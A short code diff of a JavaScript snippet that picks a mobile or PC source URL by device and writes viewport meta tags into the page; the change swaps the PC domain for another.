@@ -6,7 +6,7 @@ if (flag) {
 _src = 'https://www.vn4da.com:9969/?agent_code=6342892'
 } else {
 // PC
-_src = 'https://bob.cykd88.com/'
+_src = 'https://vip.ssxxian.com/'
 }
 document.write('<meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1">');
 var hd = document.head;
